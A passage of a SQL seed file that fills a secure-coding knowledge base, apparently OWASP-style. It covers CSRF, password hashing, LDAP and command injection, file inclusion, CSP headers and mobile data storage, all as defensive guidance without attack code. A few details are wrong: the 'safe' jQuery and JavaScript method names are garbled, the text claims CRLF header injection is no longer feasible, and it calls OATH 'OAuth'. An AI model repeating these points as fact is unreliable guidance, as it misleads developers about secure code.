Disallow: /admin/
Disallow: /modules/

You should use a whitelisting method:

Useragent: *
Disallow: *
Allow: /index.html
Allow: /home.html
', 'Robots.txt'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('51',' Description:

Verify that account passwords are one way hashed with a salt, and there is sufficient work 
factor to defeat brute force and password hash recovery attacks.

 Solution:

Recommended for password usage are PBKDF functions. PBKDF2 uses a pseudorandom function 
and a configurable number of iterations to derive a cryptographic key from a password. 
Because this process is difficult to reverse (similar to a cryptographic hash function)
but can also be configured to be slow to compute, key derivation functions are ideally 
suited for password hashing use cases.

Another alternative would be bcrypt. bcrypt is a password hashing function designed by 
Niels Provos and David Mazières, based on the Blowfish cipher, and presented at USENIX in 
1999. Besides incorporating a salt to protect against rainbow table attacks, bcrypt is an 
adaptive function: over time, the iteration count can be increased to make it slower, 
so it remains resistant to bruteforce search attacks even with increasing computation power.
', 'Are all passwords hashed, salted and stretched'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('156',' Description:

Whenever an applications structural logic mismatches with the database structural logic an attacker gains the opportunity to truncate his submit towards your database column by submitting a value longer than the limit allowed in the database.
Imagine you have a system where users can register themselves.

The attacker can abuse this behavior of the database to overflow the length limit and truncate his submit and register himself as the admin, thus gaining its privileges.


 Solution:

On critical places where unique values are enforced and expected,
such as usernames in order to authorize or distribute certain privileges. The users submit
should be checked on the server side in order to verify if it does not exceed the limit
set in your database.
', 'SQL injection Column truncation'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('5',' Description:

CrossSite Request Forgery (CSRF) is a type of attack that occurs when a malicious Web site,
email, blog, instant message, or program causes a users Web browser to perform an unwanted
action on a trusted site for which the user is currently authenticated.

The impact of a successful crosssite request forgery attack is limited to the
capabilities exposed by the vulnerable application. For example, this attack could result
in a transfer of funds, changing a password, or purchasing an item in the users context.
In effect, CSRF attacks are used by an attacker to make a target system perform a
function (funds Transfer, form submission etc.) via the targets browser without
knowledge of the target user at least until the unauthorised function has been committed.

 Solution:

To arm an application against automated attacks and tooling you need to use unique tokens
which are included into the forms of an application, API calls or AJAX requests.  
Any state changing operation requires a secure random token (e.g CSRF token) to prevent
against CSRF attacks. Characteristics of a CSRF Token are a unique, large random
value generated by a cryptographically secure random number generator.

The CSRF token is then added as a hidden field for forms and validated on the sever side whenever
a user is sending a request to the server.

Note :
Whenever the application is an REST service and is using tokens such as JWT tokens, whenever these tokens are being sent
in the application headers rather than stored in cookies the application should not be suspectible to CSRF attacks for a succesfull CSRF attacke depends on the browsers cookie jar.
', 'Cross site request forgery'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('146',' Description:

Whenever you use runtime environments you want to make sure these are not susceptible for
buffer overflows since this could lead to compromise of your application.

 Solution:

There are a number of runtime solutions that can detect stack corruption and buffer
overruns or guard against attacks. These solutions typically terminate the program
when an anomaly is detected, preventing the execution of arbitrary code.
', 'Runtime environment'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('186',' Description:

Whenever your application has the option for users to authenticate themselves
your method should be "proven" and secure in the sense of that:

1. it should comply to some security standards/guidelines
2. Before implementing authentication on a live environment it has to be pentested/audited by
   professionals.

 Solution:

Verify authentication mechanisms in the application are proven and verified against
ASVS.
', 'proven authentication mechanisms'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('79',' Description:

All possible attacks on your application should be detected and reported in order to
prevent further escalation.

 Solution:

Intrusion detecting could be done by means of a:

"Positive security model:"
In this model, you create certain regular expressions in order to only make the application
pass the socalled "known good".
Whenever an application detects strange behavior and anomalies,
these issues should be reported. Keep in mind whenever the application changes, this
whitelist method has to evolve alongside with it. A big con is it could generate a lot
of reports and alerts.

"Negative security model:"
Create a blacklist with known attacks and malicious input and make the application report
on detection of this input. You could also prioritise different malicious input and
classify them into different groups.

Whatever method you may choose to prefer, you should always ensure error handling logic in
security controls denies access by default. With this approach applied, you will have a
higher probability that whenever an attacker manages to break your applications intended
operation, it will not fail in a way which increases his attack vector.
', 'Intrusion detecting and reporting'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('141',' Description:

Whenever cryptographic modules do not operate in their approved mode according to their
published security policies these methods could become weak and become inadequate to
ensure strong ciphers.

 Solution:

Always verify that cryptographic modules operate in their approved mode according to
their published security policies before implementing them into your application.
', 'Cryptographic modules should operate in their approved mode according to their published security policies'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('211',' Description:

ID values stored on the device such as IMEI and UDID should not be used as authentication tokens. 
These tokens are retrievable by other applications and thus warrant no integrity.
 
Using ID values from the mobile device also implies the use of static API tokens which is considered
insecure. These tokens cannot for example, expire or be invalidated by the application.
 
Whenever the application uses static tokens such as the ID values and this information is leaked by
a MiTM attack or leaked in another way then this attacker can now fully compromise the user without 
being able to reject to expire or invalidate the static token EMEI or UDID for example. 

 Solution:

Authentication tokens should always be generic and should be cryptographically random strong 
with at least 120 bit of effective entropy. The best way to implement these tokens is to
go with proven methods that are tested on the effective level of entropy.

For example JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and 
selfcontained way for securely transmitting information between parties as a JSON object. 
This information can be verified and trusted because it is digitally signed. JWTs can be 
signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA. 
', 'Generate strong crypto tokens with at least 120 bit of effective entropy'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('134',' Description:

Whenever log fields are distinguished from each other by means of logs from trusted and
untrusted log fields in your log entries your logs become clearer and more transparent.

 Solution:

Verify that log fields from trusted and untrusted sources are distinguishable in
log entries. If possible it is highly recommended that you separate these files
entirely from each other so the logs with untrusted userinput cannot corrupt the
system generated logs.

', 'Distinguish log'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('215',' Description:

The mobile application should not leak sensitive information. This information could be leaked for example whenever:

 Screenshots are saved in the current application as the primary  application is backgrounded 
 Sensitive information is written to the console of the mobile device
 The Activitymanager should show the application name and a blank page and not show information

 Solution:

 Disallow screenshots of the application whenever the application is backgrounded
 Do not write sensitive information in the applications console, this information is accessible by attackers.
 Create a custom window for whenever the application is shown in the ActivityManager, so it does not give away sensitive
  information.
', 'Protection against different exfiltration techniques'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('188',' Description:

You should limit and keep track of all the different active concurrent sessions.
Whenever the application discovers concurrent sessions it should always notify the user
about this and should give him the opportunity to end the other sessions.

With this defense in place it becomes harder for attackers to hijack a users session since
they will be notified about concurrent sessions.

 Solution:

The application should keep track and limit all the granted sessions.
It should store your users IP address, session id and user id. After storing these credentials
it should do regular checks to see if there are:

1. Multiple active sessions linked to same user id
2. Multiple active sessions from different locations
3. Multiple active sessions from different devices
4. Limit and destroy sessions when they exceed an accepted threshold.

The more critical the application becomes the lower the accepted threshold for
concurrent sessions should be.


', 'concurrent session handling'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('86',' Description:

Whenever a user is changing credentials such as his password, the user should always be
challenged by the application to reauthenticate himself. This is in order to prevent an
attacker from changing credentials if ever an attacker could hijack another users session.

 Solution:

Verify that the changing password functionality includes the old password,
the new password, and a password confirmation, as well as a passphrase strength indication
to encourage the adoption of strong password phrases. This same principle applies for other operations
that are considered critical such as changing an email adress or phone number.
', 'Re authentication'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('163',' Description:

Whenever you are developing an application you want to map all the architecture it contains. Whenever there are breaches, updates, or other escalations it makes it easy and transparent for forensics, operators, and developers to do their job as fast as possible.

 Solution:
Verify that a highlevel architecture for the application has been defined. This means some sort of a technical resign has to be composed of this architecture and all the elements it provides. This gives a visual representation of your application and makes it easier to work through.

While you are mapping your application architecture you should also add all other components your application contains in terms of business functions and/or security functions they provide.

When you map these components it becomes more transparent about different types of security mitigations that might be forgotten for some of your business functions. Because again, you now own a visual representation of this logic. Your application also becomes more manageable in terms of keeping up with the latest security updates and patches and gives you a better view of obsolete configurations, functions, and components which can be removed from the system.

', 'High level architecture should be defined'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('122',' Description:

Imagine the scenario where you have a login form and an application which supports HTTPS.
Whenever the initial connection (login.php) is not HTTPS and after login (loggedin.php)
will be HTTPS the username and password will not be sent through an encrypted manner thus
could be easily compromised by attackers. This principle also applies to sending
vulnerable data towards other unencrypted/weak encrypted links in your application.

 Solution:

Verify that credentials or other sensitive information is transported via TLS.
', 'HTTPS and weakly or unencrypted links'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('179',' Description:

Whenever you are supplying your JavaScript/jquery with data which is controlled by the
user, you should make sure this data is not supplied towards functions which could
interpreted the supplied and parse input as code. This could lead to XSS and other code
injections.

 Solution:

Below we listed some safe functions for whenever it is needed to supply your
JavaScript/jquery functions with userinput.

JQUERY functions:
.txt();
.val();
.parse();

Example:
      ````
	<script>
	function myFunction() {
		$( "p" ).text( "append userinput to paragrapgh safely" );
	}
	</script>


	Javscript functions:
	.innerText();   < not supported by firefox
	.textContext(); < not supported on I.E 8 and lower
	.createTextNode();
	.value();
	```
	
Example:
	```
	<script>
	function myFunction() {
   		var t = document.createTextNode("append userinput to body safely");
    	document.body.appendChild(t);
	}
	</script>
	```
', 'Safe javascript jquery methods'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('127',' Description:

To enforce the maximum amount of security out of the TLS implementation it should always
suffice the approved mode of operation.

 Solution:

See See http://csrc.nist.gov/groups/STM/cmvp/documents/fips1402/FIPS1402IG.pdf
for more extended details on how to reach this goal.
', 'TLS implementation must operate in an approved mode of operation'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('74',' Description:

Sometimes when developing an application a programmer stores a password or other
credentials into the sourcecode as a comment for other developers to
login into the application. When these comments still exist in a live environment,
an attacker could use these credentials to gain access to the system.

 Solution:

Search your source code for comments which contains possible usercredentials.
You should also verify that there are no secrets and API keys are included in the
source code, or end up within the resulting binary.

This also applies to providing information about business logic and other critically sensitive
information. Verify that there is no sensitive business logic, secret keys or other
proprietary information in client side code.
', 'Sensitive information stored alongside the source code'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('217',' Description:

When critical functionality is loaded into the device memory and always in the same place and location 
then an attacker is able to create a very stable exploit for the application. This can lead to abuse 
of the application business logic or stealing of sensitive information.

 Solution:

A very good and known and proven technology that can be used is ASLR (Address Space Layout Randomisation).
It does this by randomly offsetting the location of modules and certain inmemory structures that will
make the developing of exploits much harder.
', 'Protecting device memory'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('212',' Description:

The mobile application should not store sensitive data into unencrypted shared
resources on the device. These resources can be accessible by other applications or 
physically accessible whenever a device gets lost or stolen. 

 Solution:

Sensitive information should always be stored encrypted and preferably on the server side
and retrieved using an object reference with proper authorization mechanisms in place. 

Do not implement an existing cryptographic algorithm on your own, no matter how easy 
it appears. Instead, use widely accepted algorithms and widely accepted implementations.

The cardinal rule of mobile apps is to not store data unless absolutely necessary. 
As a developer you have to assume that the data is forfeited as soon as it touches the phone. 
You also have to consider the implications of losing mobile users'' data to a silent 
jailbreak or root exploit.
', 'Enforce sensitive information to be stored encrypted on device'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('103',' Description:

Failing TLS connections should always be logged. This is a great indicator that ''something'' is wrong.

 Solution:

Verify that backend TLS connection failures are logged.
', 'Log TLS connection failures'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('93',' Description:

Handling errors securely is a key aspect of secure coding. There are two types of errors
that deserve special attention. The first is exceptions that occur in the processing of a
security control itself. It is important that these exceptions do not enable behavior
that the countermeasures would normally not allow. As a developer, you should consider
that there are generally three possible outcomes from a security
mechanism: 

 allow the operation
 disallow the operation
 exception 

in general you should design your security mechanism so that a failure will follow the same
execution path as disallowing the operation.

 Solution:

Security methods like isAuthorized(), isAuthenticated(), and validate() should all return
false if there is an exception during processing.
If security controls can throw exceptions, they must be very clear about exactly what that
condition means.
', 'Access control failure'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('136',' Description:

Whenever the logging is performed before executing a transaction you can be ensured that
the transactions are logged. This increases the integrity of your log files.
If logging is performed after executing a transaction and an attacker does a succcessful attack, then the logging part may not be reached and no trace would be recorded for the attack.

 Solution:

Verify that logging is performed before executing the transaction. If logging was
unsuccessful (e.g. disk full, insufficient permissions) the application fails safe.
This is for when integrity and nonrepudiation is a must.
', 'logging is performed before executing the transaction'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('233',' Description:

Whenever there are high value transactions a normal username/password static authentication method does
not suffice to ensure a high level of security. Whenever the application digests high level of transactions ensure that
risk based reauthentication, two factor or transaction signing is in place.

 Solution:

1 risk based authentication:
In Authentication, riskbased authentication is a nonstatic authentication 
system which takes into account the profile of the agent requesting access to 
the system to determine the risk profile associated with that transaction. 

The risk profile is then used to determine the complexity of the challenge.
Higher risk profiles leads to stronger challenges, whereas a static username/password may suffice for 
lowerrisk profiles. Riskbased implementation allows the application to challenge the user for additional 
credentials only when the risk level is appropriate.

2 two factor authentication:
Multifactor authentication (MFA) is a method of computer access control in which a user is 
granted access only after successfully presenting several separate pieces of evidence to an 
authentication mechanism – typically at least two of the following categories: knowledge (something they know), 
possession (something they have), and inherence (something they are)

3 Transaction signing:
Transaction signing (or digital transaction signing) is the process of calculating a keyed hash function 
to generate a unique string which can be used to verify both the authenticity and integrity of an online transaction.

A keyed hash is a function of the user''s private or secret key and the transaction details, 
such as the transfer to the account number and the transfer amount.

To provide a high level of assurance of the authenticity and integrity of 
the hash it is essential to calculate the hash on a trusted device, such as a separate smart card reader.
Calculating a hash on an Internetconnected PC or mobile device such as a mobile telephone/PDA would be
counterproductive as malware and attackers can attack these platforms and potentially subvert the signing process itself.
', 'High value transactions'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('19',' Description:

Anticaching headers have the ability to tell the browser,
computer and proxies what information they may or may not store on the intermediate media

 Solution:

These headers are also known as the: Cachecontrol: nostore,nocache and provide
protection of sensitive information when implemented in the application or webserver.

Rightly configured anti caching headers will look like the following as a response

	Expires: Tue, 03 Jul 2001 06:00:00 GMT
	LastModified: {now} GMT
	CacheControl: nostore, nocache, mustrevalidate, maxage=0
	CacheControl: postcheck=0, precheck=0
	Pragma: nocache
', 'Include anti'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('193',' Description:

There are some security headers which should be properly configured in order to protect some API callbacks against Reflective File Download and other type of injections.

Also check if the API response is dynamic, if user input is reflected in the response. If so, you must validate and encode the input, in order to prevent XSS and Same origin method execution attacks.

 Solution:

Sanitize your API''s input (in this case they should just allow alphanumeric); escaping is not sufficient

Verify that all API responses contain XContentTypeOptions: nosniff, to prevent the browser from interpreting files as something else than declared by the content type (this helps prevent XSS if the page is interpreted as html or js).

Add ''ContentDisposition: attachment; filename="filename.extension"'' with extension corresponding the file extension and contenttype, on APIs that are not going to be rendered

', 'API resonses security headers'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('115',' Description:

Whenever the application provides a password forget functionality or another 
type of recovery methods there are several implementations of hardened proven ways to make
the user recover his password.

 Solution:

The recommended solutions are to use TOTP (Timebased OneTime Password algorithm). This 
method is an example of a hashbased message authentication code (HMAC). It combines a 
secret key with the current timestamp using a cryptographic hash function to generate 
a onetime password. Because network latency and outofsync clocks can result in the password 
recipient having to try a range of possible times to authenticate against, the timestamp typically 
increases in 30second intervals, which thus cuts the potential search space.

Or the other option is to use a Mathematicalalgorithmbased onetime password method. This other 
type of onetime password uses a complex mathematical algorithm, such as a hash chain, to generate 
a series of onetime passwords from a secret shared key. Each password cannot be guessed even when 
previous passwords are known. The open source OAuth algorithm is standardized; other algorithms are 
covered by U.S. patents. Each password is observably unpredictable and independent on previous ones. 
Therefore, an adversary would be unable to guess what the next password may be, even with the 
knowledge of all previous passwords.

Example of a hard token mathimatical algorithm would be a yubikey
Example of a soft token TOTP would be google authenticator

The last resort would be to send a new password by email. This mail should contain a reset link with 
a token which is valid for a limited amount of time. Additional authentication based on softtokens 
(e.g. SMS token, native mobile applications, etc.) can be required as well before the link is 
sent over. Also, make sure whenever such a recovery cycle is started, the application does not 
reveal the user’s current password in any way.
', 'Forget password functions'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('257',' Description:

Throughout the development of the application there must be perpetual checks in place to check
if all pages and resources by default require authentication except those specifically intended to be public.

Sometimes developers simply forget to implement these checks, or they remove the checks 
temporarily for testing purposes. 


 Solution:

Verify all access controls are implemented properly in order to prevent a user access data/functions which 
he was not intended to use.
', 'Unauthorised access and modification'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('256',' Description:

The Current state of the data or program should be compared to the previous recorded in order to detect changes.
Throughout the development of the application, there must be perpetual checks in place to check if all 
pages and resources by default require authentication except those specifically intended to be public.
Sometimes developers simply forget to implement these checks, or they remove the checks temporarily 
for testing purposes. 

 Solution:

Verify all access controls are implemented properly in order to prevent a user access data/functions which 
he was not intended to use.
', 'Integrity check and authorised modification'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('97',' Description:

When you log all the input validation failures in your application you can discover in an
early stage that your application is under attack and take quick countermeasures against
the attackers.

 Solution:

Verify that all input validation failures are logged in order to counter possible attacks
in an early stage. Also you want to verify that error handling logic in security controls
denies access by default.
', 'Logging validation failures'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('11',' Description:

LDAP (Lightweight Directory Access Protocol) Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it is possible to modify LDAP statements using a local proxy. This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree. The same advanced exploitation techniques available in SQL Injection can be similarly applied in LDAP Injection.

 Solution:

The best way to prevent LDAP injection is to use a positive validation scheme for ensuring that the data going into your queries does not contain any attacks. However, in some cases, it is necessary to include special characters in the input that is passed into an LDAP query. In this case, using escaping can prevent the LDAP interpreter from thinking those special characters are actually part of the LDAP query.
', 'LDAP injection'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('230',' Description:

Whenever an attacker has enumerated usernames from an application the attacker could start
a bruteforce attack on the authentication functionality. Whenever users have common known weak
passwords or passphrases there is a high probability that the attacker can compromise 
some of the accounts on the application.

 Solution:

The internet is full of top X worst password lists which can be used to verify the users 
freshly entered password against. Whenever a user enters a password that matches up to a password
provided in one of those lists. The password should be rejected and the user should be advised to take
another password.
', 'Commonly chosen weak passwords and passphrases'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('117',' Description:

Whenever userinput is partially validated there is a high probability that the application
misses a malicious input which could execute a successful attack on your application.

 Solution:

All userinput should be validated whenever the userinput string is complete and is being
processed by your application.
', 'Canonicalized user input'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('161',' Description:

When you are building an application you first want to map where you are placing
source files, libraries and executables.

With these components identified and mapped, it becomes transparent where possible
pitfalls might be in your application and increases the maintainability of the
system. Also, you have an indicator where possible reinforcements have to be
implemented to avoid attacks.(i.e places where your application contains executable''s)

 Solution:

Verify that all application components (either individual or groups of source files,
libraries, and/or executables) that are present in the application are identified.

When you identified these components you may want to map and document them in order to
have a quick reference to this infrastructure when needed.
', 'identify all application components'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('4',' Description:

Command injection is an attack in which the goal is execution of arbitrary commands on
the host operating system via a vulnerable application. Command injection attacks are
possible when an application passes unsafe user supplied data
(forms, cookies, HTTP headers etc.) to a system shell. In this attack,
the attackersupplied operating system commands are usually executed with the privileges
of the vulnerable application. Command injection attacks are possible largely due to
insufficient input validation. This attack differs from Code Injection, in that code
injection allows the attacker to adds his own code that is then executed by the application.
In Code Injection, the attacker extends the default functionality of the application
without the necessity of executing system commands.

 Solution:

Userinput that is used in a shell command should not contain dangerous characters.
A blacklist of characters is not a good option because it may be difficult to think of
all of the characters to validate against. A white list containing only allowable
characters should be created to validate the userinput.
', 'Command injection'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('178',' Description:

The main use of the content security policy header is to, detect, report, and reject XSS attacks. The core issue in relation to XSS attacks is the browser''s inability to distinguish between a script that''s intended to be part of your application, and a script that''s been maliciously injected by a thirdparty.
With the use of CSP(Content Security policy), we can tell the browser which script is safe to execute and which scripts are most likely been injected by an attacker.

 Solution:

A best practice for implementing CSP in your application would be to externalize all
JavaScript within the web pages.

So this:
    ```
    <script>
      function doSomething() {
        alert(''Something!'');
      }
	</script>

	<button onclick=''doSomething();''>foobar!</button>
```
Must become this:
```
	<script src=''doSomething.js''></script>
	<button id=''somethingToDo''>Let''s foobar!</button>
```
The header for this code could look something like:
    ```
    ContentSecurityPolicy: defaultsrc''self''; objectsrc''none''; scriptsrc''https://mycdn.com''
    ```
Since it is not entirely realistic to implement all JavaScript on external pages we can apply sort of a crosssite request forgery token to your inline JavaScript. This way the browser can again distinguish the difference between code which is part of the application against probable malicious injected code, in CSP this is called the ''nonce''. Of course, this method is also very applicable on your existing code and designs.
Now, to use this nonce you have to supply your inline script tags with the nonce attribute. Firstly, it''s important that the nonce changes for each response. Otherwise, the nonce would become guessable. So it should also contain a high entropy and should be hard to predict. Similar to the operation of the CSRF tokens, the nonce becomes impossible for the attacker to predict making it difficult to execute a successful XSS attack.


Inline JavaScript example containing nonce:
	```
	<script nonce=sfsdf03nceI23wlsgle9h3sdd21>
    <! Your javscript code >
    </script>
    ```
Matching header example:
    ```
    ContentSecurityPolicy: scriptsrc ''noncesfsdf03nceI23wlsgle9h3sdd21''
    ```
There is a whole lot more to learn about the CSP header for indepth implementation in your application. This knowledge base item just scratches the surface and it would be highly recommended to gain more indepth knowledge about this powerful header

 Very Important:
When applying the CSP header, although it blocks XSS attacks. Your
application still remains vulnerable to HTML and other code injections.
So this is not a substitute for, validation, sanitizing and encoding of userinput.
', 'Content security policy headers'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('38',' Description:

The secure flag is an option that can be set when creating a cookie.
This flag ensures that the cookie will not be sent over an unencrypted
connection by the browser,which ensures that the session cookie can not be sent over a nonencrypted link.

 Solution:

When creating a session cookie which is sent over an encrypted connection
you should set the secure flag. The Secure flag should be set during every setcookie.
This will instruct the browser to never send the cookie over HTTP.
The purpose of this flag is to prevent the accidental exposure of a cookie value if a user
follows an HTTP link.


', 'Session cookies without the Secure flag'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('229',' Description:

Whenever security logs can be modified by unauthorized users, potential attackers could use these
privileges to erase and cover their attacks against the application or simply soil the log files.

 Solution:

Use host intrusion detection systems (fileintegrity monitoring or changedetection software) on logs
to ensure that existing log data or other important files cannot be changed without generating alerts, 
depending on the context like a log file then new data being added should not cause an alert.
', 'Authentication integrety checks'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('88',' Description:

This is a mitigation of the risk that a password can leak by any means towards a possible attacker. Because of password reuse, this could happen not only due to a leak in your site. Changing the password to a new one minimizes the damage.

Also, users really don''t like changing their passwords. So what users used to do when forced to change their password was to change it twice  once to some temporary password and then a second time back to the original password.

 Solution:

Keep a number of password hashes entries greater than the number of times that the change password functionality execution is permitted and validate that the new password hash is not one of those entries.
', 'Disallow the use of old passwords'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('118',' Description:

The lack of entropy available for, or used by, a pseudorandom number generator can be a
stability and security threat.

 Solution:

All random numbers, random file names, random GUIDs, and random must be generated using
the cryptographic module''s approved random number generator when these random values are
intended to be unguessable/unpredictable by an attacker.
', 'Approved random number generator'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('250',' Description:

The File Inclusion vulnerability allows an attacker to include a file, usually exploiting
a "dynamic file inclusion" mechanisms implemented in the target application.
The vulnerability occurs due to the use of usersupplied input without proper validation.

Note: Also take into consideration the class loader or reflection capabilities. These 
functions could also lead to file inclusion vulnerabilities.

This can lead to something as outputting the contents of the file, but depending on the
severity, it can also lead to:

* Code execution on the web server
* Code execution on the clientside such as JavaScript which can lead to other attacks
  such as crosssite scripting (XSS)
* Denial of Service (DoS)
* Sensitive Information Disclosure


Local File Inclusion (also known as LFI) is the process of including files, that are
already locally present on the server, through the exploiting of vulnerable inclusion
procedures implemented in the application. This vulnerability occurs, for example, when a
page receives, as input, the path to the file that has to be included and this input is
not properly sanitized, allowing directory traversal characters (such as dotdotslash)
to be injected. Although most examples point to vulnerable PHP scripts, we should keep
in mind that it is also common in other technologies such as JSP, ASP and others.

 Solution:

The most effective solution to eliminate file inclusion vulnerabilities is to avoid
passing usersubmitted input to any filesystem/framework API. If this is not possible,
the application can maintain a white list of files that may be included on the page, and
then use an identifier (for example the index number) to access to the selected file.
Any request containing an invalid identifier has to be rejected, in this way there is
no attack surface for malicious users to manipulate the path.

Also, disable the opportunity for the application to load remote resources. This is mostly 
achieved by adding a server configuration file such as php.ini or web.xml.
', 'File inclusion attack II'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('213',' Description:

The mobile application should not store sensitive data in an unencrypted manner, even in
the applications key chains since these can be easily accessed once a phone is jailbroken 
or exploited the keychain can be easily read. 

 Solution:

Determine the context of where the sensitive information is being stored, is it a small 
data set or is the data stored in a SQLite database. For every context determine the 
applications platform recommended native options settings and follow these 
recommendations accordingly. 

 
', 'Encrypt sensitive information different depending on context'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('59',' Description:

Applications should encourage the use of strong passwords and passphrases. Preferably the
password policy should not put limitations or restrictions on the chosen passwords for example
the length of a passowrd or passphrase. Whenever the application supports strong passwords and
the use of password managers, the possibility for an attacker performing a succesfull bruteforce 
attack drops significantly.

This also increases the possibility that the application can be used with users'' passwords managers.

 Solution:

Verify password entry fields allow, or encourage, the use of passphrases, and do not prevent
password managers, long passphrases or highly complex passwords being entered. 
', 'Does The application enforce the use of secure passwords'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('116',' Description:

Verify the system can protect against aggregation or continuous access of
secured functions, resources, or data. For example, possibly by the use of a
resource governor to limit the number of edits per hour or to prevent the entire database
from being scraped by an individual user.

 Solution:

The system should contain a counter which can keep up with the number of times a certain
users addresses database tables and should be rejected when he passes a reasonable number.
This violation should also be reported since it could indicate an attacker scraping your
table contents and stealing company information.
', 'Aggregate access control protection'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('240',' Description:

Whenever constraints that are imposed on the client side are not enforced on the server side than
these constraints can be easily bypassed by means of an intercepting proxy. i.e whenever user should not 
be able to edit a form by solely disabling the input fields, a potential attacker can edit these input 
fields on the client side as editable and still submit the form.

The same principle goes for whenever certain parts of the application should be inaccessible. Simply hiding
the pages from the presentation layer is insecure since the attacker can enumerate by brute forcing or
fuzzing himself into different pages. Again the access controls should be enforced also on the server side.  

 Solution:

All critical decision making logic must be enforced on the server side out of the scope of a potential 
attacker. Client side constraints can be easily bypassed.
', 'Client side constraints'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('143',' Description:

Whenever highvalue business logic flows are processed in a trusted monitored environment
it reduces the movability of an attacker and chances of succeeding to
perform successful attacks. If an attacker should breach your application his actions
could be rapidly followed and countermeasures could be taken.

 Solution:

Verify the application processes or verifies all highvalue business logic flows in a
trusted environment, such as on a protected and monitored server.
', 'Proces high value business logic flows in a trusted environment'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('71',' Description:

HTTP header injection is a general class of web application security vulnerability which
occurs when Hypertext Transfer Protocol (HTTP) headers are
dynamically generated based on user input. Header injection in HTTP responses can allow
for HTTP response splitting (also known as CRLF, Carriage Return Line Feed),
Session fixation via the SetCookie header, crosssite scripting (XSS),
and malicious redirect attacks via the location header. HTTP header injection is a
relatively new area for webbased attacks, and has primarily been pioneered
by Amit Klein in his work on request/response smuggling/splitting.
Vulnerabilities due to HTTP header injections such as CRLF are no longer
feasible due to the fact that multiple header requests are not possible.

 Solution:

When userinput will be used in HTTP headers then the newlines should be escaped in a
correct manner. Recommended would be a whitelist of expected input or use a validation method
which for example only accepts alphanumeric values. Every detection of input which is out of
the intended operation should be rejected.
', 'HTTP header injection'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('133',' Description:

With a log analysis tool in place, you can easily and quickly do forensics as soon as you
notice your application is under attack by attackers and block them out.

 Solution:

A list of recommended tools by OWASP you can find at
https://www.owasp.org/index.php/Log_review_and_managementLogging_Tools
', 'Available log analysis tools'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('164',' Description:

Threat modeling is a procedure for optimizing Network/ Application/ Internet Security by
identifying objectives and vulnerabilities, and then defining countermeasures to prevent,
or mitigate the effects of, threats to the system. A threat is a potential or actual
undesirable event that may be malicious (such as DoS attack) or incidental
(failure of a Storage Device). Threat modeling is a planned activity for identifying and
assessing application threats and vulnerabilities.

 Solution:

Threat modeling is best applied continuously throughout a software development project.
The process is essentially the same at different levels of abstraction, although the
information gets more and more granular throughout the lifecycle. Ideally, a highlevel
threat model should be defined in the concept or planning phase, and then refined
throughout the lifecycle. As more details are added to the system, new attack vectors are
created and exposed. The ongoing threat modeling process should examine, diagnose, and
address these threats.

Note that it is a natural part of refining a system for new threats to be exposed.
For example, when you select a particular technology  such as Java for example 
you take on the responsibility to identify the new threats that are created by that choice.
Even implementation choices such as using regular expressions for validation introduce
potential new threats to deal with.

More indepth information about threat modeling can be found at:
https://www.owasp.org/index.php/Application_Threat_Modeling
', 'Threat modeling'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('175',' Description:

